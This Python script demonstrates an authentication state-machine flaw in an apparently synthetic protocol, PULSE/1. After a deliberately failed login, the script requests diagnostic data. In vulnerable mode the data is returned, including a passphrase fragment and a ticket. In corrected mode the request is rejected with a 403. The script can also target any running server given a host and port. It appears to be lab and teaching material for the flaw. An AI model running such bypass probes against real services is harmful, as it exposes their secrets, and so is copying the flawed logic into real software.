"""Demonstration script for PULSE/1 protocol authentication flaw.

Demonstrates the state machine flaw where READ_DIAG succeeds after failed authentication
in vulnerable mode, and compares it with corrected mode.
"""

from __future__ import annotations

import argparse
import json
import sys
from typing import Any

from parallax.pulse.client import PulseClient
from parallax.pulse.constants import DEFAULT_PORT, MessageType
from parallax.pulse.server import PulseServer


def run_flaw_demo(
    client: PulseClient,
    target_description: str = "PULSE/1 Service",
) -> dict[str, Any]:
    """Execute the 4-step breach sequence demonstrating the authentication state flaw."""
    print(f"\n{'=' * 65}")
    print(f"[*] Target: {target_description} ({client.host}:{client.port})")
    print(f"{'=' * 65}")

    # Step 1: HELLO
    print("[1] Sending HELLO handshake frame...")
    hello_resp = client.hello()
    print(f"    <-- [{hello_resp.msg_type.name}] {json.dumps(hello_resp.payload)}")

    # Step 2: Failed AUTH
    print("\n[2] Submitting invalid credentials via AUTH frame...")
    auth_resp = client.auth(username="svc-pulse", password="invalid_password_attempt")
    print(f"    <-- [{auth_resp.msg_type.name}] {json.dumps(auth_resp.payload)}")

    # Step 3: Exploit READ_DIAG
    print("\n[3] Requesting diagnostic telemetry via READ_DIAG frame...")
    diag_resp = client.read_diag("system_config")
    print(f"    <-- [{diag_resp.msg_type.name}] {json.dumps(diag_resp.payload)}")

    # Step 4: CLOSE
    print("\n[4] Sending CLOSE frame to terminate session...")
    close_resp = client.close_session()
    print(f"    <-- [{close_resp.msg_type.name}] {json.dumps(close_resp.payload)}")

    return {
        "hello": hello_resp,
        "auth": auth_resp,
        "diag": diag_resp,
        "close": close_resp,
    }


def run_demo_suite(
    host: str = "127.0.0.1",
    port: int | None = None,
    mode: str = "both",
) -> int:
    """Run demonstration against either an existing server or local ephemeral test instances."""
    if port is not None:
        # Connect to existing running server
        print(f"[*] Connecting to existing PULSE/1 service on {host}:{port}...")
        with PulseClient(host=host, port=port) as client:
            results = run_flaw_demo(client, target_description="Existing Server")
            diag_resp = results["diag"]
            if diag_resp.msg_type == MessageType.READ_DIAG:
                print("\n[!] VULNERABILITY CONFIRMED: READ_DIAG succeeded despite failed authentication.")
                print("    Leaked parameters:")
                for k, v in diag_resp.payload.items():
                    print(f"      - {k}: {v}")
            elif diag_resp.msg_type == MessageType.ERROR:
                print("\n[+] SECURE: Server properly rejected READ_DIAG with authentication error.")
            return 0

    print("[*] Starting self-contained synthetic PULSE/1 protocol demonstration...")

    if mode in ("vulnerable", "both"):
        print("\n" + "#" * 65)
        print("# DEMONSTRATION 1: Vulnerable Mode (Scenario Flaw Active)")
        print("#" * 65)
        with PulseServer(host=host, port=0, vulnerable=True) as vuln_server:
            with PulseClient(host=host, port=vuln_server.port) as client:
                res = run_flaw_demo(client, "Synthetic Vulnerable Daemon")
                diag = res["diag"]
                assert diag.msg_type == MessageType.READ_DIAG, "Expected READ_DIAG to succeed"
                print("\n[!] RESULT: State machine flaw confirmed!")
                print("    Unauthenticated client received sensitive diagnostic configuration:")
                print(f"    - Helper Path: {diag.payload.get('helper_path')}")
                print(f"    - Passphrase Fragment: {diag.payload.get('encryption_passphrase_fragment')}")
                print(f"    - Diagnostic Ticket: {diag.payload.get('diagnostic_ticket')}")

    if mode in ("corrected", "both"):
        print("\n" + "#" * 65)
        print("# DEMONSTRATION 2: Corrected Mode (Secure Enforcement)")
        print("#" * 65)
        with PulseServer(host=host, port=0, vulnerable=False) as corr_server:
            with PulseClient(host=host, port=corr_server.port) as client:
                res = run_flaw_demo(client, "Synthetic Corrected Daemon")
                diag = res["diag"]
                assert diag.msg_type == MessageType.ERROR, "Expected READ_DIAG to be rejected"
                assert diag.payload.get("code") == 403, "Expected HTTP 403 / auth error"
                print("\n[+] RESULT: Flaw mitigated! Server rejected unauthenticated READ_DIAG query.")
                print(f"    - Response code: {diag.payload.get('code')}")
                print(f"    - Error message: {diag.payload.get('error')}")

    print("\n[+] Demonstration completed successfully.")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Demonstrate the PULSE/1 authentication state machine flaw."
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="Target host address (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Port of an already running PULSE/1 server (if omitted, spawns local demo instances)",
    )
    parser.add_argument(
        "--mode",
        choices=["both", "vulnerable", "corrected"],
        default="both",
        help="Demo mode to run when self-hosting (default: both)",
    )

    args = parser.parse_args()
    return run_demo_suite(host=args.host, port=args.port, mode=args.mode)


if __name__ == "__main__":
    sys.exit(main())
